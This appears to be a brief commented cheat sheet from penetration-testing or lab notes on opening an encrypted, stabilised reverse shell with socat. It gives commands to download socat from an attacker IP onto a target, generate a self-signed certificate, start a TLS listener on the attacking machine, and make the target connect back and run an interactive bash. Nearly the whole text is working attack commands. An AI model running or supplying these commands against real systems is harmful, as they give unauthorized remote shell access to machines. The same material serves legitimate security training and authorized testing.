# use the non-interactive shell to download socat binary
wget 10.10.10.20/socat -O /tmp/socat

# create a 2048 bit RSA key with matching cert file
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# setup a listener on the attacking machine
# "echo=0" argument is equivalent to using the "stty raw -echo; fg" trick
socat openssl-listen:80,cert=shell.pem,verify=0 file:'tty',raw,echo=0

# connect to the listener from the target machine
# - pty:    allocates a pseudoterminal on the target -- part of the stabilisation process
# - stderr: makes sure that any error messages get shown in the shell
# - sigint: passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
# - setsid: creates the process in a new session
# - sane:   stabilises the terminal, attempting to "normalise" it.
socat openssl:10.10.10.20:80,verify=0 exec:"bash -li",pty,stderr,sigint,setsid,sane